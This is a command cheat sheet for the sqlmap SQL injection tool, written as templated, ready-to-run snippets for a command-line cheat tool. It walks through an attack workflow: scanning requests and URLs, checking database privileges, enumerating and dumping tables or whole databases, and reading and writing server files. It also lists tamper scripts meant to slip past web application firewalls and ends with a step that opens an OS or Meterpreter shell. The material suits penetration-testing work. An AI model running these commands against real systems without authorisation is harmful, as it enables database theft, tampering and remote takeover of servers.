# Sqlmap

<!-- cheat
export sqlmap
var sqlmap_templates = printf '%s\n' '# no im scared...' '--risk=3 --level=5 # yes, i dont care' --- --header 'Scan everything?'
var sqlmap_shell_templates = printf '%s\n' '--os-pwn # Prompt for an OOB shell, Meterpreter or VNC' '--os-shell # Prompt for an interactive operating system shell' --- --header 'Sqlmap shell template'
-->

## sqlmap - Enumeration

### Scan from request.txt

Run sqlmap against a captured Burp/ZAP request file. Easiest way to keep auth headers and POST bodies intact.

```sh title:"sqlmap against captured request, preserves auth headers"
sqlmap -r $file $sqlmap_templates --batch
```
<!-- cheat
import sqlmap
import files
-->

### Check DB privileges

Check the DB user's privileges. Run before attempting --os-shell or --file-read.

```sh title:"Sqlmap Check DB user privileges (gate for shell/file-read)"
sqlmap -r $file $sqlmap_templates --batch --privileges
```
<!-- cheat
import sqlmap
import files
-->

### List databases

Enumerate databases on the backend. Step 1 of data extraction.

```sh title:"Sqlmap Enumerate databases on the backend"
sqlmap -r $file $sqlmap_templates --batch --dbs
```
<!-- cheat
import sqlmap
import files
-->

### List tables

Enumerate tables in a specific database.

```sh title:"Sqlmap Enumerate tables in named database"
sqlmap -r $file $sqlmap_templates --batch -D $db --tables
```
<!-- cheat
import sqlmap
import files
var db
-->

### List columns

Enumerate columns in a specific table.

```sh title:"Sqlmap Enumerate columns in named table"
sqlmap -r $file $sqlmap_templates --batch -D $db -T $table --columns
```
<!-- cheat
import sqlmap
import files
var db
var table
-->

### GET URL scan

Run sqlmap against a URL directly.

```sh title:"sqlmap direct GET URL scan"
sqlmap -u "$url" $sqlmap_templates --batch
```
<!-- cheat
import sqlmap
var url
-->

### POST data scan

Run sqlmap against a URL with POST data.

```sh title:"sqlmap direct POST data scan"
sqlmap -u "$url" --data="$params" $sqlmap_templates --batch
```
<!-- cheat
import sqlmap
var url
var params
-->

### Cookie scan

Run sqlmap with a supplied Cookie header.

```sh title:"sqlmap direct URL scan with cookie"
sqlmap -u "$url" --cookie="$cookie" $sqlmap_templates --batch
```
<!-- cheat
import sqlmap
var url
var cookie
-->

## sqlmap - Extraction

### Dump one table

Dump a single named table. Faster than --dump on full DBs and easier to review.

```sh title:"Sqlmap Dump one named table, faster than full DB dump"
sqlmap -r $file $sqlmap_templates --batch -D $db -T $table --dump
```
<!-- cheat
import sqlmap
var file
var db
var table
-->

### Dump columns

Dump specific columns from a table.

```sh title:"Sqlmap Dump selected columns from table"
sqlmap -r $file $sqlmap_templates --batch -D $db -T $table -C "$columns" --dump
```
<!-- cheat
import sqlmap
var file
var db
var table
var columns
-->

### Dump entire DB

Dump every table in the named database. Watch size.

```sh title:"Sqlmap Dump every table in database (watch size)"
sqlmap -r $file $sqlmap_templates --batch -D $db --dump
```
<!-- cheat
import sqlmap
var file
var db
-->

### Read file from server

Read a file from the database server filesystem via SQL primitives. Check --privileges first; FILE/READ rights required.

```sh title:"Sqlmap Read file via SQL primitives, needs FILE rights"
sqlmap -r req.txt --batch $sqlmap_templates --file-read=$file_path
```
<!-- cheat
import sqlmap
var file_path
-->

### Write file to server

Write a local file to the database server filesystem. Check privileges first.

```sh title:"Sqlmap Write file via SQL primitives, needs FILE rights"
sqlmap -r $file --batch $sqlmap_templates --file-write="$local_file" --file-dest="$remote_path"
```
<!-- cheat
import sqlmap
var file
var local_file
var remote_path
-->

## sqlmap - Tamper

### Generic tamper list

Run with a broad generic tamper list.

```sh title:"Sqlmap Run with broad generic tamper list"
sqlmap -u "$url" $sqlmap_templates --batch --tamper=apostrophemask,apostrophenullencode,base64encode,between,chardoubleencode,charencode,charunicodeencode,equaltolike,greatest,ifnull2ifisnull,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2plus,space2randomblank,unionalltounion,unmagicquotes
```
<!-- cheat
import sqlmap
var url
-->

### MySQL tamper list

Run with a MySQL-focused tamper list.

```sh title:"Sqlmap Run with MySQL-focused tamper list"
sqlmap -u "$url" $sqlmap_templates --batch --dbms=MYSQL --tamper=between,charencode,charunicodeencode,equaltolike,greatest,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,sp_password,space2comment,space2dash,space2mssqlblank,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes
```
<!-- cheat
import sqlmap
var url
-->

### MSSQL tamper list

Run with an MSSQL-focused tamper list.

```sh title:"Sqlmap Run with MSSQL-focused tamper list"
sqlmap -u "$url" $sqlmap_templates --batch --dbms=MSSQL --tamper=between,bluecoat,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2hash,space2morehash,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords,xforwardedfor
```
<!-- cheat
import sqlmap
var url
-->

## sqlmap - Shell

### Get shell

Try to land an OS shell or OOB shell via the SQL service account. Loud and only works on permissive DB users.

```sh title:"Sqlmap Land OS / OOB shell via SQL service account"
sqlmap -r $file $sqlmap_templates --batch $sqlmap_shell_templates 
```
<!-- cheat
import sqlmap
var file
-->
